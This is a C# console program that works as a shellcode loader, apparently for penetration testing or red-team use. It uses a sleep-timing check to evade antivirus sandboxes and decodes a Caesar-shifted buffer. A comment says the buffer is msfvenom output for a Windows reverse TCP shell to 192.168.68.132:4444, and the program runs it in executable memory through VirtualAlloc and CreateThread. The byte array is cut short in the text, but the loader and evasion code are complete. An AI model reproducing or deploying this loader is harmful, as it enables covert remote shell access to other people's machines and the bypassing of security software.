using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    internal class Program
    {
        [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)] static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
        static void Main(string[] args)
        {
            // Basic sleep av evasion
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if(t2 < 4.5)
            {
                return;
            }
            
            //  msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.68.132 LPORT=4444 -f csharp -o rev.txt
            byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,...};

            // Simple Ceasar cipher shift
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
            }

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}
